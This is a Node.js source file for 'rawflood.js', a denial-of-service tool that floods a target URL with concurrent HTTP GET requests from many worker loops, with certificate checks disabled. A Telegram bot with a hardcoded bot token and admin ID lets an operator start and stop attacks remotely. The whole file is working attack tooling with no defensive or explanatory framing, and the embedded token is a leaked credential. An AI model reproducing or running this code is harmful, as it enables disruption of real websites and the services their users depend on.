const http = require('http');
const https = require('https');
const url = require('url');
const { exec } = require('child_process');

class RawFlood {
    constructor() {
        this.stats = {
            requests: 0,
            errors: 0,
            success: 0
        };
        this.startTime = Date.now();
        this.isRunning = false;
        this.attackProcess = null;
    }

    async floodTarget(target, time, rate, threads) {
        this.isRunning = true;
        const parsedUrl = url.parse(target);
        const protocol = parsedUrl.protocol === 'https:' ? https : http;
        const duration = parseInt(time) * 1000;
        const endTime = Date.now() + duration;
        
        console.log(`🚀 Starting Raw Flood Attack`);
        console.log(`🎯 Target: ${target}`);
        console.log(`⏱️ Time: ${time}s`);
        console.log(`⚡ Rate: ${rate}ms`);
        console.log(`🧵 Threads: ${threads}`);
        console.log(`💥 Mode: Raw Flood (No Bypass)\n`);

        const workers = [];
        
        for (let i = 0; i < threads; i++) {
            workers.push(this.createWorker(protocol, parsedUrl, rate, endTime, i));
        }

        const statsInterval = setInterval(() => {
            this.displayStats();
            if (Date.now() >= endTime || !this.isRunning) {
                clearInterval(statsInterval);
                this.isRunning = false;
                console.log('\n✅ Attack completed!');
                process.exit(0);
            }
        }, 2000);

        await Promise.all(workers);
    }

    createWorker(protocol, target, rate, endTime, workerId) {
        return new Promise((resolve) => {
            const worker = async () => {
                while (Date.now() < endTime && this.isRunning) {
                    try {
                        await this.makeRawRequest(protocol, target);
                        await new Promise(r => setTimeout(r, rate));
                    } catch (error) {
                        this.stats.errors++;
                    }
                }
                resolve();
            };
            worker();
        });
    }

    makeRawRequest(protocol, target) {
        return new Promise((resolve) => {
            const options = {
                hostname: target.hostname,
                port: target.port || (target.protocol === 'https:' ? 443 : 80),
                path: target.path || '/',
                method: 'GET',
                timeout: 5000,
                rejectUnauthorized: false
            };

            const req = protocol.request(options, (res) => {
                this.stats.requests++;
                if (res.statusCode === 200) {
                    this.stats.success++;
                }
                res.on('data', () => {});
                res.on('end', () => resolve());
            });

            req.on('error', () => {
                this.stats.errors++;
                resolve();
            });

            req.on('timeout', () => {
                this.stats.errors++;
                req.destroy();
                resolve();
            });

            req.end();
        });
    }

    displayStats() {
        const runtime = Math.floor((Date.now() - this.startTime) / 1000);
        const rps = runtime > 0 ? (this.stats.requests / runtime).toFixed(2) : '0';
        
        console.log(`📊 Requests: ${this.stats.requests} | ✅ Success: ${this.stats.success} | ❌ Errors: ${this.stats.errors} | ⚡ RPS: ${rps}`);
    }

    stop() {
        this.isRunning = false;
        console.log('\n🛑 Attack stopped by Telegram bot command');
        this.displayStats();
        process.exit(0);
    }
}

class TelegramBot {
    constructor() {
        this.token = '7580314584:AAFLRinlnilclZpQgXt4fc5uKu2YSUwxH4k';
        this.adminId = '6142661532';
        this.baseUrl = `https://api.telegram.org/bot${this.token}`;
        this.flood = new RawFlood();
        this.activeAttack = null;
    }

    async sendMessage(chatId, text) {
        try {
            const response = await fetch(`${this.baseUrl}/sendMessage`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    chat_id: chatId,
                    text: text
                })
            });
            return await response.json();
        } catch (error) {
            console.error('Send message error:', error);
        }
    }

    async handleUpdate(update) {
        if (!update.message) return;
        
        const chatId = update.message.chat.id;
        const text = update.message.text;
        const userId = update.message.from.id;

        if (userId.toString() !== this.adminId) {
            await this.sendMessage(chatId, '❌ Unauthorized access');
            return;
        }

        if (text === '/start') {
            await this.sendMessage(chatId, 
                '🤖 Raw Flood Bot\n\n' +
                'Commands:\n' +
                '/start - Show help\n' +
                '/attack target time rate thread - Start attack\n' +
                '/stop - Stop current attack\n' +
                'Example: /attack https://example.com/ 60 100 10'
            );
        } else if (text.startsWith('/attack ')) {
            await this.handleAttackCommand(chatId, text);
        } else if (text === '/stop') {
            await this.handleStopCommand(chatId);
        }
    }

    async handleAttackCommand(chatId, text) {
        const args = text.split(' ').slice(1);
        
        if (args.length < 4) {
            await this.sendMessage(chatId, 
                '❌ Invalid format\n' +
                'Usage: /attack target time rate thread\n' +
                'Example: /attack https://example.com/ 60 100 10'
            );
            return;
        }

        const [target, time, rate, thread] = args;
        
        if (!target.startsWith('http')) {
            await this.sendMessage(chatId, '❌ Invalid target URL');
            return;
        }

        if (this.activeAttack) {
            await this.sendMessage(chatId, '⚠️ Another attack is already running. Use /stop first.');
            return;
        }

        await this.sendMessage(chatId, '🔄 Starting attack...');

        this.activeAttack = {
            target: target,
            time: parseInt(time),
            rate: parseInt(rate),
            thread: parseInt(thread),
            startTime: Date.now()
        };

        setTimeout(() => {
            this.startFloodAttack(target, time, rate, thread, chatId);
        }, 1000);
    }

    async handleStopCommand(chatId) {
        if (!this.activeAttack) {
            await this.sendMessage(chatId, '❌ No active attack to stop');
            return;
        }

        await this.sendMessage(chatId, '🛑 Stopping attack...');
        
        if (this.flood.isRunning) {
            this.flood.stop();
        }
        
        this.activeAttack = null;
        await this.sendMessage(chatId, '✅ Attack stopped successfully');
    }

    startFloodAttack(target, time, rate, thread, chatId) {
        console.log(`Starting Telegram bot attack: ${target} ${time}s ${rate}ms ${thread} threads`);
        
        this.flood.floodTarget(target, time, rate, thread).then(() => {
            this.activeAttack = null;
            this.sendMessage(chatId, `✅ Attack completed!\nTarget: ${target}\nDuration: ${time}s`);
        }).catch(error => {
            console.error('Attack error:', error);
            this.activeAttack = null;
            this.sendMessage(chatId, '❌ Attack failed: ' + error.message);
        });
    }

    async startPolling() {
        let offset = 0;
        
        while (true) {
            try {
                const response = await fetch(`${this.baseUrl}/getUpdates?offset=${offset}&timeout=60`);
                const data = await response.json();
                
                if (data.ok && data.result.length > 0) {
                    for (const update of data.result) {
                        await this.handleUpdate(update);
                        offset = update.update_id + 1;
                    }
                }
            } catch (error) {
                console.error('Polling error:', error);
                await new Promise(resolve => setTimeout(resolve, 5000));
            }
        }
    }
}

if (require.main === module) {
    const args = process.argv.slice(2);
    
    if (args.length === 4) {
        const [target, time, rate, thread] = args;
        const flood = new RawFlood();
        flood.floodTarget(target, parseInt(time), parseInt(rate), parseInt(thread));
    } else if (args.length === 0) {
        const bot = new TelegramBot();
        console.log('🤖 Telegram Bot Started...');
        bot.startPolling();
    } else {
        console.log('Usage:');
        console.log('  node rawflood.js target time rate thread');
        console.log('  node rawflood.js (to start Telegram bot)');
        console.log('\nExamples:');
        console.log('  node rawflood.js https://example.com/ 60 100 10');
        process.exit(1);
    }
}

module.exports = { RawFlood, TelegramBot };
